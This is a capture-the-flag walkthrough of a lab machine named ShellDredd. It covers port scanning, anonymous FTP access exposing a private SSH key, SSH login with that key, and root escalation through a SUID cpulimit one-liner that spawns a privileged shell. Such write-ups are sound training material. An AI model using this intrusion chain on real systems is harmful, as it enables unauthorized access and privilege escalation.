# IP: 	 192.168.188.130


# NMAP
```javascript
                                                                             
┌──(dx㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 192.168.188.130  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 00:07 EDT
Warning: 192.168.188.130 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.188.130
Host is up (0.16s latency).
Not shown: 55497 closed tcp ports (conn-refused), 10036 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
61000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 50.34 seconds
┌──(dx㉿kali)-[~]
└─$ nmap -p 21,61000 -sCV 192.168.188.130    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 00:13 EDT
Nmap scan report for 192.168.188.130
Host is up (0.24s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
                                                                 
```


## FTP - TCP 21

### FTP-Enumeration
`` First Connect and Enumerate the server``
```javascript


                                                                             
┌──(dx㉿kali)-[~]
└─$ ftp 192.168.188.130
Connected to 192.168.188.130.
220 (vsFTPd 3.0.3)
Name (192.168.188.130:dx): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||8122|)
150 Here comes the directory listing.
226 Directory send OK.
```
``This seems to be empty directory let's list all the content by using -a tag with ls``
```javascript
ftp> ls -a
229 Entering Extended Passive Mode (|||49213|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
```
``This directory contain a hidden directory called .hannah . Lets list all the content of the directory``
```javascript
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -a
229 Entering Extended Passive Mode (|||55010|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
```
```We Found Private SSH Key in the hidden directory. We will download the key in our attacker machine```
```javascript
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||34204|)
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
100% |********************************|  1823        7.36 MiB/s    00:00 ETA
226 Transfer complete.
1823 bytes received in 00:00 (5.91 KiB/s)

```

# Exploitation

## SSH

``We have found the ssh key from .hannah directory , let first give permission and then authenticate user against the SSH service on port 61000. ``
```javascript
┌──(dx㉿kali)-[~]
└─$ chmod 0600 id_rsa        
                                                                              
┌──(dx㉿kali)-[~]
└─$ ssh -i id_rsa hannah@192.168.188.130 -p 61000
The authenticity of host '[192.168.188.130]:61000 ([192.168.188.130]:61000)' can't be established.
ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.188.130]:61000' (ED25519) to the list of known hosts.
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ 
```
``We have obtained Local Access on the target Machine``
# Escalation

#### SUID Enumeration
```javascript
hannah@ShellDredd:~$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd
```


/usr/bin/cpulimit -l 100 -f -- /bin/sh -p
